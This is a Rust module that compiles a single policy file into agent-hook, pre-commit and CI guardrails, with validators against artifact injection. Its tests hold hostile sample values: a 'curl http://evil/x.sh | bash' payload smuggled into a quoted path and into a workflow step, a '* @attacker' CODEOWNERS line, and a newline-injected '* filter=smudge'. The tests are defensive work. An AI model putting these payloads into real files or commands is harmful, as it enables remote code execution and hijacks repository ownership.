//! The single policy source — `aoa-policy.yaml` — and its compilation to the
//! three enforcement planes (PRD R5).
//!
//! One declared policy (protected paths, generated globs, mutation-gateway
//! allowlist, the reproduction-gate toggle) compiles deterministically to:
//!
//! - a **runtime** plane (the Claude Code hooks; generated in the CLI layer,
//!   which owns the hook wire-format),
//! - a **pre-commit** plane ([`precommit_config`]),
//! - a **CI** plane ([`ci_workflow`] + [`codeowners`]).
//!
//! Three planes because each has a different bypass: the runtime hook guards the
//! agent, the pre-commit hook guards a local `git commit` (bypassable with
//! `--no-verify`), and CI is the unbypassable backstop.
//!
//! This crate is mechanism only (ZFC): schema parsing, glob membership, and
//! string templating. It makes no semantic judgment — the *policy* is the
//! operator's, declared in the file.

use serde::Deserialize;
use thiserror::Error;

mod generate;
mod infer;

pub use generate::{ci_workflow, codeowners, precommit_config};
pub use infer::{
    infer_owners, proposed_codeowners, render_proposal_diff, BlameCount, OwnedPattern,
};

/// Errors raised parsing or compiling a policy.
#[derive(Debug, Error)]
pub enum PolicyError {
    /// The YAML did not parse against the [`Policy`] schema (unknown key, wrong
    /// type, malformed document). Fails loud rather than defaulting.
    #[error("invalid aoa-policy.yaml: {0}")]
    Parse(#[from] serde_norway::Error),

    /// A declared glob is not a valid pattern.
    #[error("invalid glob '{glob}' in {field}: {source}")]
    Glob {
        field: &'static str,
        glob: String,
        source: globset::Error,
    },

    /// A declared value contains syntax that could escape its generated-artifact
    /// context and change executable workflow or CODEOWNERS behavior.
    #[error("unsafe value in {field}: contains characters unsafe for generated artifacts")]
    UnsafeValue { field: &'static str },
}

/// Reject controls that could add lines or non-printing syntax to a generated
/// artifact.
fn reject_unsafe(field: &'static str, value: &str) -> Result<(), PolicyError> {
    if value.chars().any(char::is_control) {
        return Err(PolicyError::UnsafeValue { field });
    }
    Ok(())
}

/// Reject characters that can terminate or expand a single-quoted Bash token.
fn reject_shell_unsafe(field: &'static str, value: &str) -> Result<(), PolicyError> {
    reject_unsafe(field, value)?;
    if value
        .chars()
        .any(|character| matches!(character, '\'' | '"' | '`' | '$' | '\\'))
    {
        return Err(PolicyError::UnsafeValue { field });
    }
    Ok(())
}

/// CODEOWNERS separates patterns from owners with whitespace, so allowing it
/// inside an operator-supplied pattern would permit extra owner declarations.
fn reject_codeowners_unsafe(field: &'static str, value: &str) -> Result<(), PolicyError> {
    reject_unsafe(field, value)?;
    let unsupported_pattern = value.is_empty()
        || value.starts_with('#')
        || value.starts_with("\\#")
        || value
            .chars()
            .any(|character| matches!(character, '!' | '[' | ']'));
    if value.chars().any(char::is_whitespace) || unsupported_pattern {
        return Err(PolicyError::UnsafeValue { field });
    }
    Ok(())
}

/// The operator's declared policy. Every field is optional and defaults to the
/// least-surprising empty/permissive value, except `reproduction_required`
/// which defaults on — the safe default is to enforce the R7 gate.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Policy {
    /// Globs an agent may not write. Enforced at all three planes.
    #[serde(default)]
    pub protected_paths: Vec<String>,

    /// Globs that are generated artifacts (edit the source instead). Declared
    /// here; the in-band marking is R6.
    #[serde(default)]
    pub generated_paths: Vec<GeneratedPath>,

    /// Modules permitted to perform state-changing writes (mutation gateways);
    /// becomes the CODEOWNERS spine.
    #[serde(default)]
    pub gateway_allowlist: Vec<String>,

    /// Whether the runtime reproduction-before-mutation gate (R7) is active.
    #[serde(default = "default_true")]
    pub reproduction_required: bool,
}

fn default_true() -> bool {
    true
}

/// A declared generated-artifact path: a glob, optionally paired with the
/// `source` it derives from so a block can redirect the agent to the file it
/// should edit instead. A bare YAML string is a glob with no declared source
/// (back-compat); a mapping carries both.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(untagged)]
pub enum GeneratedPath {
    /// `- "**/*.gen.rs"` — glob only, no source pointer.
    Glob(String),
    /// `- { glob: "**/*.gen.rs", source: "schema.json" }`.
    Sourced(SourcedPath),
}

/// The mapping form of a [`GeneratedPath`]: a glob paired with the source it
/// derives from. `deny_unknown_fields` makes a mistyped key (`srource:`) fail
/// loud — `#[serde(untagged)]` does not inherit the outer `Policy`'s strictness,
/// so the contract lives here.
#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct SourcedPath {
    pub glob: String,
    pub source: String,
}

impl GeneratedPath {
    /// The glob this entry matches against — present in either form.
    pub fn glob(&self) -> &str {
        match self {
            GeneratedPath::Glob(glob) => glob.as_str(),
            GeneratedPath::Sourced(sourced) => sourced.glob.as_str(),
        }
    }

    /// The declared source to edit instead, when the entry carries one.
    pub fn source(&self) -> Option<&str> {
        match self {
            GeneratedPath::Sourced(sourced) => Some(&sourced.source),
            GeneratedPath::Glob(_) => None,
        }
    }
}

impl Default for Policy {
    fn default() -> Self {
        Policy {
            protected_paths: Vec::new(),
            generated_paths: Vec::new(),
            gateway_allowlist: Vec::new(),
            reproduction_required: true,
        }
    }
}

impl Policy {
    /// Parse a policy from YAML text, failing loud on any schema violation.
    pub fn from_yaml(yaml: &str) -> Result<Self, PolicyError> {
        let policy: Policy = serde_norway::from_str(yaml)?;
        // Compile eagerly so a bad glob is reported at load, not at first write.
        policy.compile()?;
        Ok(policy)
    }

    /// Compile the protected-path globs into a matcher. Surfaces a bad pattern
    /// as a typed error rather than silently dropping it.
    pub fn compile(&self) -> Result<CompiledPolicy, PolicyError> {
        let mut builder = globset::GlobSetBuilder::new();
        for pattern in &self.protected_paths {
            reject_shell_unsafe("protected_paths", pattern)?;
            let glob = globset::Glob::new(pattern).map_err(|source| PolicyError::Glob {
                field: "protected_paths",
                glob: pattern.clone(),
                source,
            })?;
            builder.add(glob);
        }
        let protected = builder.build().map_err(|source| PolicyError::Glob {
            field: "protected_paths",
            glob: self.protected_paths.join(", "),
            source,
        })?;
        // Validate the generated globs at load too, for fail-loud parity with
        // protected paths. The matchers themselves are built lazily by the R6
        // wiring in the CLI; here we only reject a malformed pattern early.
        for entry in &self.generated_paths {
            reject_unsafe("generated_paths glob", entry.glob())?;
            if let Some(source) = entry.source() {
                reject_unsafe("generated_paths source", source)?;
            }
            globset::Glob::new(entry.glob()).map_err(|source| PolicyError::Glob {
                field: "generated_paths",
                glob: entry.glob().to_string(),
                source,
            })?;
        }
        for module in &self.gateway_allowlist {
            reject_codeowners_unsafe("gateway_allowlist", module)?;
        }
        Ok(CompiledPolicy { protected })
    }
}

/// A policy with its globs compiled, ready to test paths against.
#[derive(Debug, Clone)]
pub struct CompiledPolicy {
    protected: globset::GlobSet,
}

impl CompiledPolicy {
    /// Whether `path` (repo-relative) is write-protected by the policy.
    pub fn is_protected(&self, path: &str) -> bool {
        self.protected.is_match(path)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_a_full_policy() {
        let yaml = r#"
protected_paths:
  - "migrations/**"
  - ".github/**"
generated_paths:
  - "**/*.gen.rs"
gateway_allowlist:
  - "src/db/gateway.rs"
reproduction_required: true
"#;
        let policy = Policy::from_yaml(yaml).unwrap();
        assert_eq!(policy.protected_paths.len(), 2);
        assert!(policy.reproduction_required);
    }

    #[test]
    fn reproduction_required_defaults_on() {
        let policy = Policy::from_yaml("protected_paths: []").unwrap();
        assert!(policy.reproduction_required);
    }

    #[test]
    fn unknown_key_fails_loud() {
        let err = Policy::from_yaml("protcted_paths: []").unwrap_err();
        assert!(matches!(err, PolicyError::Parse(_)));
    }

    #[test]
    fn bad_glob_fails_loud_at_load() {
        let err = Policy::from_yaml("protected_paths: [\"[unclosed\"]").unwrap_err();
        assert!(matches!(err, PolicyError::Glob { .. }));
    }

    #[test]
    fn generated_path_parses_bare_glob_and_sourced_forms() {
        let yaml = r#"
generated_paths:
  - "**/*.gen.rs"
  - glob: "api/openapi.yaml"
    source: "api/spec.toml"
"#;
        let policy = Policy::from_yaml(yaml).unwrap();
        assert_eq!(policy.generated_paths.len(), 2);
        // Bare string: glob with no declared source (back-compat).
        assert_eq!(policy.generated_paths[0].glob(), "**/*.gen.rs");
        assert_eq!(policy.generated_paths[0].source(), None);
        // Mapping: glob paired with the source to edit instead.
        assert_eq!(policy.generated_paths[1].glob(), "api/openapi.yaml");
        assert_eq!(policy.generated_paths[1].source(), Some("api/spec.toml"));
    }

    #[test]
    fn bad_generated_glob_fails_loud_at_load() {
        let err = Policy::from_yaml("generated_paths: [\"[unclosed\"]").unwrap_err();
        assert!(matches!(
            err,
            PolicyError::Glob {
                field: "generated_paths",
                ..
            }
        ));
    }

    #[test]
    fn sourced_generated_path_rejects_unknown_keys() {
        // deny_unknown_fields on SourcedPath: a mistyped key must fail loud, not
        // silently drop, matching the strictness of the rest of the schema.
        let yaml = "generated_paths:\n  - glob: \"x.gen.rs\"\n    source: \"x.toml\"\n    srource: \"oops\"\n";
        let err = Policy::from_yaml(yaml).unwrap_err();
        assert!(matches!(err, PolicyError::Parse(_)));
    }

    #[test]
    fn generated_path_with_newline_in_source_is_rejected() {
        // A newline in source would inject an unrelated line into the emitted
        // .gitattributes block (e.g. `* filter=smudge`). Reject it at load.
        let yaml =
            "generated_paths:\n  - glob: \"x.gen.rs\"\n    source: \"x.toml\\n* filter=smudge\"\n";
        let err = Policy::from_yaml(yaml).unwrap_err();
        assert!(matches!(
            err,
            PolicyError::UnsafeValue {
                field: "generated_paths source"
            }
        ));
    }

    #[test]
    fn generated_glob_with_newline_is_rejected() {
        let yaml =
            "generated_paths:\n  - glob: \"x.gen.rs\\n* filter=smudge\"\n    source: \"x.toml\"\n";
        let err = Policy::from_yaml(yaml).unwrap_err();
        assert!(matches!(
            err,
            PolicyError::UnsafeValue {
                field: "generated_paths glob"
            }
        ));
    }

    #[test]
    fn policy_artifact_injection_payloads_are_rejected_at_load() {
        let payloads = [
            "a' ; curl http://evil/x.sh | bash ; '",
            "safe/**\n      - name: Injected\n        run: curl http://evil/x.sh | bash",
            "m.rs @owners\n* @attacker",
        ];

        for field in ["protected_paths", "gateway_allowlist"] {
            for payload in payloads {
                let escaped = payload
                    .replace('\\', "\\\\")
                    .replace('"', "\\\"")
                    .replace('\n', "\\n");
                let yaml = format!("{field}: [\"{escaped}\"]");
                let err = Policy::from_yaml(&yaml).unwrap_err();
                assert!(
                    matches!(err, PolicyError::UnsafeValue { field: actual } if actual == field),
                    "{field} accepted artifact-injection payload {payload:?}: {err}"
                );
            }
        }
    }

    #[test]
    fn protected_paths_reject_shell_metacharacters() {
        for character in ['\'', '"', '`', '$', '\\'] {
            let value = format!("safe{character}path")
                .replace('\\', "\\\\")
                .replace('"', "\\\"");
            let yaml = format!("protected_paths:\n  - \"{value}\"");
            let err = Policy::from_yaml(&yaml).unwrap_err();
            assert!(
                matches!(
                    err,
                    PolicyError::UnsafeValue {
                        field: "protected_paths"
                    }
                ),
                "protected_paths accepted shell metacharacter {character:?}: {err}"
            );
        }
    }

    #[test]
    fn gateway_allowlist_rejects_controls_and_unsupported_codeowners_patterns() {
        for yaml_value in [
            "#gateway.rs",
            "!gateway.rs",
            "[ab]gateway.rs",
            "gateway\\0.rs",
            "gateway\\u001b.rs",
        ] {
            let yaml = format!("gateway_allowlist: [\"{yaml_value}\"]");
            let err = Policy::from_yaml(&yaml).unwrap_err();
            assert!(
                matches!(
                    err,
                    PolicyError::UnsafeValue {
                        field: "gateway_allowlist"
                    }
                ),
                "gateway_allowlist accepted invalid CODEOWNERS pattern {yaml_value:?}: {err}"
            );
        }
    }

    #[test]
    fn protected_matching_respects_globs() {
        let policy =
            Policy::from_yaml("protected_paths: [\"migrations/**\", \".github/**\"]").unwrap();
        let compiled = policy.compile().unwrap();
        assert!(compiled.is_protected("migrations/0001_init.sql"));
        assert!(compiled.is_protected(".github/workflows/ci.yml"));
        assert!(!compiled.is_protected("src/lib.rs"));
    }
}
